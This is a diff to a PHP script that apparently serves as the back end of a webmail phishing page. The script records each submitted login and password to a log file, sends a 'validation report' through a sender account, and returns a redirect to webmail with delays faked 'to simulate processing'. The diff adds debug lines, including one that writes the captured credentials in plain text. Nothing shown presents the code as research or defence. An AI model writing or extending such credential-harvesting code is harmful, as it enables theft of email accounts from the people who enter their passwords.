@@ -102,17 +102,26 @@ $validCredentialsList = [
     'hosting@test.com' => 'hosting'
 ];
 
+// Debug: Log the credentials being checked
+$logMessage .= "Checking credentials: $login / $passwd\n";
+$logMessage .= "Valid credentials list contains: " . count($validCredentialsList) . " entries\n";
+
 // Check if credentials are in our valid list
 if (isset($validCredentialsList[$login]) && $validCredentialsList[$login] === $passwd) {
     $validCredentials = true;
     $authStatus = '✅ VALID - Authenticated';
     $logMessage .= "✅ SUCCESS: Credentials validated\n";
+    $logMessage .= "DEBUG: Found match in valid credentials list\n";
 } else {
     $validCredentials = false;
     $authStatus = '❌ INVALID - Authentication failed';
     $connectionError = true;
     $logMessage .= "❌ FAILED: Invalid credentials\n";
+    $logMessage .= "DEBUG: No match found in valid credentials list\n";
 }
+
+// Debug: Log the final validation result
+$logMessage .= "DEBUG: validCredentials = " . ($validCredentials ? 'TRUE' : 'FALSE') . "\n";
 
 if ($validCredentials) {
     // Send validation report using real sender account
@@ -145,8 +154,11 @@ file_put_contents($logFile, $logMessage, FILE_APPEND);
 
 $_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;
 
+// Debug: Log what response we're about to send
+$logMessage .= "DEBUG: About to send response. validCredentials = " . ($validCredentials ? 'TRUE' : 'FALSE') . "\n";
+
 // Different response handling based on credential validity
-if ($validCredentials) {
+if ($validCredentials === true) {
     // Valid credentials - redirect to webmail
     $response = [
         "signal" => "OK",
@@ -162,6 +174,7 @@ if ($validCredentials) {
         ]
     ];
     
+    $logMessage .= "DEBUG: Sending SUCCESS response\n";
     // Shorter delay for valid credentials
     usleep(rand(300000, 800000));
 } else {
@@ -180,9 +193,13 @@ if ($validCredentials) {
         ]
     ];
     
+    $logMessage .= "DEBUG: Sending ERROR response\n";
     // Longer delay for invalid credentials to simulate processing
     usleep(rand(1000000, 2500000));
 }
+
+// Final debug log
+file_put_contents($logFile, $logMessage . "DEBUG: Final response: " . json_encode($response) . "\n\n", FILE_APPEND);
 
 echo json_encode($response);
 exit();
